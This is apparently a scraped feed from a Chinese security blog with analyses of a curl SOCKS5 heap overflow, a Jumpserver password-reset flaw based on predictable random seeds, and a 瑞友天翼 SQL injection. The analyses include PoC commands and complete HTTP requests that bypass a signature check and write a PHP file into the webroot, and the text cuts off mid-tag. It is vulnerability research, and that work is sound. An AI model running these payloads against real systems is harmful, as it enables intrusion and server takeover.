style="display:flex;"><span><span style="color:#75715e">/* Authentication is complete, now specify destination to the proxy */</span></span></span><span style="display:flex;"><span> len<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> socksreq[len<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>;<span style="color:#75715e">/* version (SOCKS5) */</span></span></span><span style="display:flex;"><span> socksreq[len<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;<span style="color:#75715e">/* connect */</span></span></span><span style="display:flex;"><span> socksreq[len<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#75715e">/* must be zero */</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>socks5_resolve_local) {</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>socksreq[len], sx<span style="color:#f92672">-></span>hostname, hostname_len);<span style="color:#75715e">/* w/o NULL */</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">/* FALLTHROUGH */</span></span></span></code></pre></div><p>此时curl会尝试将主机名通过memcpy拷贝到tcp 请求体中，而socksreq指向的内存由Curl_preconnect分配</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CURLcode<span style="color:#a6e22e">Curl_preconnect</span>(<span style="color:#66d9ef">struct</span> Curl_easy<span style="color:#f92672">*</span>data)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>data<span style="color:#f92672">-></span>state.buffer) {</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-></span>state.buffer<span style="color:#f92672">=</span><span style="color:#a6e22e">malloc</span>(data<span style="color:#f92672">-></span>set.buffer_size<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>data<span style="color:#f92672">-></span>state.buffer)</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> CURLE_OUT_OF_MEMORY;</span></span><span style="display:flex;"><span>  }</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> CURLE_OK;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在我的环境中可以看到最终的内存大小为0x8ce+1</p><pre tabindex="0"><code>gef➤ p data.set.buffer_size
$12 = 0x8ce
gef➤</code></pre><p>所以如果构造大于这个大小的hostname，在memcpy时就可以触发堆溢出。</p><p><strong>PoC</strong></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808<span style="color:#66d9ef">$(</span>python3 -c<span style="color:#e6db74">"print('A'*10000,end='')"</span><span style="color:#66d9ef">)</span></span></span></code></pre></div><h3 id="小结">小结</h3><p>在修复代码中，如果hostname超过255则会直接返回错误，而不再访问后面的状态机，直接阻断了调用链。虽然url的hostname没有长度规定，可以超过1024，但由于DNS解析最大只支持255字节的域名，所以在正常请求中不应该出现域名大于255的情况，从这个角度看此次修复方式也很合理。</p><p>从利用角度看这个漏洞，攻击者需要可以控制curl或libcurl使用的socks5代理，还需要控制传递给curl和libcurl的url，而后才能触发漏洞，表面看攻击者可以控制溢出的范围和内容，很可能通过堆溢出造成代码执行。但curl会通过url parser去验证url有效性，如果url无效则会产生错误，因此只当url合法时才会触发漏洞，也就是攻击者构造的url只能是ASCII字符的子集，综合上面的条件，这个漏洞利用难度极大，造成代码执行的几率很小。</p><p>考虑到大部分软件即使能控制url，但也不能控制让libcurl使用socks5代理，所以可以择期修复这个漏洞。</p><p><strong>题外话</strong>
这个漏洞还让curl的作者难过了一下：<em><strong>It burns in my soul</strong></em>. 作者说，如果使用内存安全的语言重写curl的话，那这些漏洞就不会存在，当然在可预见的未来curl还是会用c开发，但目前可行的办法是逐渐使用内存安全的依赖项替代。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://curl.se/docs/CVE-2023-38545.html" target="_blank">https://curl.se/docs/CVE-2023-38545.html</a></p><p><a href="https://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/" target="_blank">https://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/</a></p><p><a href="https://hackerone.com/reports/2187833" target="_blank">https://hackerone.com/reports/2187833</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc1928" target="_blank">https://datatracker.ietf.org/doc/html/rfc1928</a></p></blockquote><p><strong>Created at 2023-10-11T20:40:32+08:00</strong></p></description></item><item><title>CVE-2023-4863 Libwebp Rce 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</link><pubDate>Sat, 07 Oct 2023 10:23:56 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</guid><description><p><strong>Created at 2023-10-07T10:23:56+08:00</strong></p></description></item><item><title>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</link><pubDate>Fri, 29 Sep 2023 20:32:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</guid><description><h3 id="基本信息">基本信息</h3><p>jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。
利用该漏洞需要已知用户名和对应的邮箱。</p><h4 id="指纹">指纹</h4><p>hunter</p><pre tabindex="0"><code>web.title="jumpserver"</code></pre><h3 id="影响版本">影响版本</h3><ul><li>CVE-2023-42820
v2.24 - v3.6.4</li></ul><h3 id="环境搭建">环境搭建</h3><p>参考<a href="https://github.com/jumpserver/Dockerfile" target="_blank">https://github.com/jumpserver/Dockerfile</a>，将版本改为3.6.4，使用docker启动即可。</p><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>补丁分析</strong>
漏洞在commit<a href="https://github.com/jumpserver/jumpserver/commit/0eba6d2175ab752399c5aee2dbaaf311bf0a398d" target="_blank">0eba6d2175ab752399c5aee2dbaaf311bf0a398d</a>修复，查看补丁，可知在<code>apps/common/utils/random.py#random_string</code>处增加了 random.seed()调用，同时对<code>apps/users/models/user.py#generate_reset_token</code>生成token改为增加了<code>random.seed</code>调用的random_string函数<img alt="" src="/images/vulnerability/CVE-2023-42820-jumpserver-pwd-reset-vuln.zh-cn.assets/1.png"/></p><p>到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。</p><p><strong>技术分析</strong>
在前两天有师傅写出了分析，才恍然大悟。</p><p>根据<a href="https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw" target="_blank">jumpserver最新re-auth复现（伪随机经典案例）</a>可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>opt<span style="color:#f92672">/</span>jumpserver<span style="color:#f92672">/</span>apps<span style="color:#f92672">/</span>authentication<span style="color:#f92672">/</span>api<span style="color:#f92672">/</span>password<span style="color:#f92672">.</span>py</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">create</span>(self, request,<span style="color:#f92672">*</span>args,<span style="color:#f92672">**</span>kwargs):</span></span><span style="display:flex;"><span> token<span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">'token'</span>)</span></span><span style="display:flex;"><span> userinfo<span style="color:#f92672">=</span> cache<span style="color:#f92672">.</span>get(token)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">not</span> userinfo:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> HttpResponseRedirect(reverse(<span style="color:#e6db74">'authentication:forgot-previewing'</span>))</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> serializer<span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_serializer(data<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>data)</span></span><span style="display:flex;"><span> serializer<span style="color:#f92672">.</span>is_valid(raise_exception<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)</span></span><span style="display:flex;"><span> username<span style="color:#f92672">=</span> userinfo<span style="color:#f92672">.</span>get(<span style="color:#e6db74">'username'</span>)</span></span><span style="display:flex;"><span> form_type<span style="color:#f92672">=</span> serializer<span style="color:#f92672">.</span>validated_data[<span style="color:#e6db74">'form_type'</span>]</span></span><span style="display:flex;"><span> code<span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">6</span>, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">"/tmp/code"</span>,<span style="color:#e6db74">"a"</span>)<span style="color:#66d9ef">as</span> f:</span></span><span style="display:flex;"><span> f<span style="color:#f92672">.</span>write(code<span style="color:#f92672">+</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>)</span></span><span style="display:flex;"><span> other_args<span style="color:#f92672">=</span> {}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> target<span style="color:#f92672">=</span> serializer<span style="color:#f92672">.</span>validated_data[form_type]</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> form_type<span style="color:#f92672">==</span><span style="color:#e6db74">'sms'</span>:</span></span><span style="display:flex;"><span> query_key<span style="color:#f92672">=</span><span style="color:#e6db74">'phone'</span></span></span><span style="display:flex;"><span> target<span style="color:#f92672">=</span> target<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">'+'</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:</span></span><span style="display:flex;"><span> query_key<span style="color:#f92672">=</span> form_type</span></span><span style="display:flex;"><span> user, err<span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>is_valid_user(username<span style="color:#f92672">=</span>username,<span style="color:#f92672">**</span>{query_key: target})</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">not</span> user:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Response({<span style="color:#e6db74">'error'</span>: err}, status<span style="color:#f92672">=</span><span style="color:#ae81ff">400</span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> subject<span style="color:#f92672">=</span><span style="color:#e6db74">'</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">'</span><span style="color:#f92672">%</span> (get_login_title(), _(<span style="color:#e6db74">'Forgot password'</span>))</span></span><span style="display:flex;"><span> context<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span><span style="color:#e6db74">'user'</span>: user,<span style="color:#e6db74">'title'</span>: subject,<span style="color:#e6db74">'code'</span>: code,</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> message<span style="color:#f92672">=</span> render_to_string(<span style="color:#e6db74">'authentication/_msg_reset_password_code.html'</span>, context)</span></span><span style="display:flex;"><span> other_args[<span style="color:#e6db74">'subject'</span>], other_args[<span style="color:#e6db74">'message'</span>]<span style="color:#f92672">=</span> subject, message</span></span><span style="display:flex;"><span> SendAndVerifyCodeUtil(target, code, backend<span style="color:#f92672">=</span>form_type,<span style="color:#f92672">**</span>other_args)<span style="color:#f92672">.</span>gen_and_send_async()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Response({<span style="color:#e6db74">'data'</span>:<span style="color:#e6db74">'ok'</span>}, status<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>)</span></span></code></pre></div><p>在大学学习c语言的rand函数时，如果不对其显式使用srand函数播种的话，则每次运行程序随机出来的结果是一样的，因为rand使用的种子在计算机启动时就不会再变化了，所以我们要使用srand函数产生种子并进行播种，来使得rand函数的结果不一样。
实际上计算机中的随机数不是真正的随机数，而是伪随机数，计算机根据传入的种子经过某些运算得出结果。
对于一个进程，随机的种子确定则随机数也确定。
这个规律在python中也一样，对于同样的seed及同样的随机次数，一定会生成同样的数字。</p><pre tabindex="0"><code>Python 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import random
>>> random.seed(1010)
>>> random.random()
0.6710054770408643
➜ chestnut python3
Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import random
>>> random.seed(1010)
>>> random.random()
0.6710054770408643
>>></code></pre><p>虽然我们现在知道了这个漏洞应该源于伪随机数，但我们如果没办法获取到随机时所设置的种子，也没办法预测随即结果。</p><p>下面就是这个漏洞的精华所在，根据文章所述。
django使用了第三方库<code>djiango-simple-captcha</code>库来生成验证码，在这个库生成的时候会有如下逻辑：
在<code>usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_image</code>中，通过传入的key设置<code>random.seed()</code>，而传入的key则是浏览器向后端请求图片的路径，下图的key为<code>c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span><span style="color:#a6e22e">captcha_image</span>(request, key, scale<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> scale<span style="color:#f92672">==</span><span style="color:#ae81ff">2</span><span style="color:#f92672">and</span><span style="color:#f92672">not</span> settings<span style="color:#f92672">.</span>CAPTCHA_2X_IMAGE:</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">raise</span> Http404</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">try</span>:</span></span><span style="display:flex;"><span>        store<span style="color:#f92672">=</span> CaptchaStore<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(hashkey<span style="color:#f92672">=</span>key)</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">except</span> CaptchaStore<span style="color:#f92672">.</span>DoesNotExist:</span></span><span style="display:flex;"><span>       <span style="color:#75715e"># HTTP 410 Gone status so that crawlers don't index these expired urls.</span></span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> HttpResponse(status<span style="color:#f92672">=</span><span style="color:#ae81ff">410</span>)</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)  <span style="color:#75715e"># Do not generate different images for the same key</span></span></span><span style="display:flex;"><span>    text<span style="color:#f92672">=</span> store<span style="color:#f92672">.</span>challenge</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-42820-jumpserver-pwd-reset-vuln.zh-cn.assets/2.png"/></p><p>也就是我们可以通过图片的url间接知道jumpserver随机时所使用的种子，也就是说，通过图片地址我们可以获取到种子，如果生成验证码时所在的进程和这个生成图片验证码的进程在同一个进程，那么我们就可以通过获取到的种子和使用jumpserver生成验证码的算法来预测jumpserver生成重置密码的验证码。
这样我们可以在很少的时间（次数）内预测到重置密码的验证码，进而重置密码。
但仅仅这么简单吗？在jumpserver中使用了<code>gunicorn</code>，它会使用master进程fork worker进程，处理用户请求，所以即使我们通过单次的图片请求获取到了random的种子，处理重置密码请求的进程可能不是被获取到种子的进程，这样预测出来的验证码和重置密码时生成的不会一样。</p><pre tabindex="0"><code>➜ chestnut docker top 808b | grep python
root 5704 5674 0 11:08 ? 00:00:02 python jms start web
root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000
root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss "%(r)s" %(s)s %(b)s --access-logfile -
root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss "%(r)s" %(s)s %(b)s --access-logfile -
root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss "%(r)s" %(s)s %(b)s --access-logfile -
root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss "%(r)s" %(s)s %(b)s --access-logfile -
root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss "%(r)s" %(s)s %(b)s --access-logfile -</code></pre><p>在文章中提到可以有两种办法：</p><ul><li>并发同时发送多个请求，通过大量请求使得每个<code>gunicorn</code>进程都会接收到图片验证码的请求，从而将所有进程的seed设置为同一个种子，这样后续重置密码时无论哪个进程接收到的请求，该进程的seed都是已知的。</li><li>通过某种办法将<code>gunicorn</code>打挂，并监测服务状态，当服务响应码从502变为200时，说明进程恢复正常，这时通过少量请求即可将所有目标进程的seed设置为我们已知的值。
并发发送大量请求让我想起了k8s环境中，pod切换IP的场景，</li></ul><p>时间比较紧（太笨了），没看出来哪里可以造成crash，在使用第一种办法的时候，发现会有些许问题</p><ul><li>在发送几千个请求之后，通过图片验证码请求触发重置密码时，后端会返回这个验证码不正确</li><li>在发送请求之后，经过测试使用seed生成和jumpserver相同的code需要经过几万次</li></ul><p>所以在这里讨巧，手动重启core container（模拟crash了gunicorn的场景），而后通过请求验证码图片设置seed，经过测试成功的次数范围为200+，即成功生成和jumpserver一样的重置密码验证码需要random两百多次。</p><h3 id="小结">小结</h3><p>回过头看文章所说的<code>随机深度</code>，按照我的理解就是在生成code时，所在进程已经random了几次，随机次数越多，预测时所要的次数也就越多，因为相同的seed经过相同的次数生成的随机数是一样的，在生成验证码和random_string函数中均有多次使用random类函数生成随机数，所以才需要循环计算进行碰撞。
在漏洞利用过程中，除了前面说的覆盖seed的问题，jumpserver还会验证请求url里面的token以及POST的body里面需要携带csrf token，这些都可以通过url解析以及xpath从请求响应中获取到。在一个就是生成重置密码验证码后，这个验证码有60秒有效期，过了60秒之后再去碰撞后端会返回验证码已过期，需要重新生成。
在有个问题就是图片验证码涉及到数学运算，粗略看来验证码应该可以通过ocr库进行识别并计算，实现自动化获取图片地址、设置seed、计算验证码等，这个只能等节后仔细研究了。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp" target="_blank">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp</a></p><p><a href="https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw" target="_blank">https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw</a></p></blockquote><p>创建于2023-09-28</p><p><strong>Created at 2023-09-29T20:32:52+08:00</strong></p></description></item><item><title>瑞友天翼 Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</link><pubDate>Wed, 20 Sep 2023 10:04:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>瑞友天翼中存在SQL注入漏洞，攻击者可以利用SQL注入写入webshell，控制目标服务器。</p><h3 id="环境搭建">环境搭建</h3><p>略</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="技术分析">技术分析</h3><p>数据库基本信息</p><pre tabindex="0"><code>127.0.0.1:5873
db: CASSystemDS
pwd: F1B5214C
user: admin</code></pre><p>在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数</p><pre tabindex="0"><code>
$initparams = $_REQUEST['initParams'];
$key = $_REQUEST['key'];
$sign = $_REQUEST['sign'];</code></pre><p>参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。</p><pre tabindex="0"><code>if ($key == "wusuokey") {
$keyVal = $COMCASWEB->getfarminfo($key);
} else if ($key == "inner") {
$keyVal = "Realor";
}
if (!isset($keyVal) || empty($keyVal)) {
write_log("{'参数非法':'key值为空'}");
exitErrorJson('参数非法');
}
$signCalculate = md5($initparams . $keyVal);
//testLog("signCalculate=" . $signCalculate);
if ($signCalculate != $sign) {
write_log("{'参数非法':'参数加密方法错误'}");
exitErrorJson('参数非法');
}</code></pre><p>之后使用两个下划线分割$initparams变量，存入数组并遍历数组</p><pre tabindex="0"><code>// 两个下划线分割，变成一个数组，之后遍历数组，用一个下划线分割并变成键值对存入$requestObj变量中。
$paramArr = explode("__", $initparams);
if (count($paramArr) == 0) {
write_log("{'参数非法':'参数中未包含__'}");
exitErrorJson('参数非法11');
}
$requestObj = null;
//testLog($paramArr);
foreach ($paramArr as $key => $value) {
$keyValue = explode("_", $value);
$requestObj[$keyValue[0]] = $keyValue[1];
}</code></pre><p>之后从键值对数组中取出键为command的值，进行判断<code>$cmd = $requestObj['command'];</code>
当$cmd为createUser时，从请求中取出POST body并尝试进行json decode，从中取出键为account的值拼接到sql语句中进行查询，此时可以使用单引号进行sql注入，借助<code>union select into outfile</code>语句写入<code>webshell</code>，达成代码执行。</p><pre tabindex="0"><code>if ($cmd == "createUser") {
$POST_JSON = json_decode($HTTP_RAW_POST_DATA, true);
$fId = getDefaultVal($POST_JSON['userGroupId'], getAdminGroupId());
$account = $POST_JSON['account'];
if (!isset($account) || empty($account)) {
write_log("{'createUser':'用户账户不可为空'}");
exitErrorJson('用户账号不可为空');
}
$account = utf8ToGbk($account);
$userPwd = $POST_JSON['userPwd'];
if (!isset($userPwd) || empty($userPwd)) {
write_log("{'createUser':'用户密码不可为空'}");
exitErrorJson('用户密码不可为空');
}
//账号是否已存在
$result = mysql_query("select * from cuser where name='" . $account . "'", $DSCon);</code></pre><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>GET<span style="color:#f92672">/</span>index.php<span style="color:#f92672">/</span>Index<span style="color:#f92672">/</span>dologin<span style="color:#f92672">?</span>name<span style="color:#f92672">=</span>aa<span style="color:#960050;background-color:#1e0010">'</span>);SELECT<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>C<span style="color:#f92672">?</span>php<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span>phpinfo();<span style="color:#f92672">?%</span><span style="color:#ae81ff">3</span>E<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span>into<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span>outfile<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22.</span>.<span style="color:#f92672">/</span>..<span style="color:#f92672">/</span>WebRoot<span style="color:#f92672">/</span><span style="color:#ae81ff">1.</span>php<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>;<span style="color:#960050;background-color:#1e0010">'</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache</span></span><span style="display:flex;"><span>User<span style="color:#f92672">-</span>Agent: sqlmap<span style="color:#f92672">/</span><span style="color:#ae81ff">1.5.8</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">stable</span> (http:<span style="color:#75715e">//sqlmap.org)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>Cookie: PHPSESSID<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span>mnhgqk6af1nmoqglg9sqfvek2;think_language<span style="color:#f92672">=</span>zh<span style="color:#f92672">-</span>cn</span></span><span style="display:flex;"><span>Host:<span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept:<span style="color:#960050;background-color:#1e0010">*/</span><span style="color:#f92672">*</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate</span></span><span style="display:flex;"><span>Connection: close</span></span></code></pre></div><p>最新版poc</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_createUser&amp;key=inner&amp;sign=8b21270d796c45333f88f7db36ed9dbe<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">170</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"account":"aaa' union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#","userPwd":"aa"}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_importUsers&amp;key=inner&amp;sign=ec7e8f5769c2455b773600c2912216fd<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">183</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"users":[{"account":"aaa' union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#","userPwd":"bbb"}]}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span 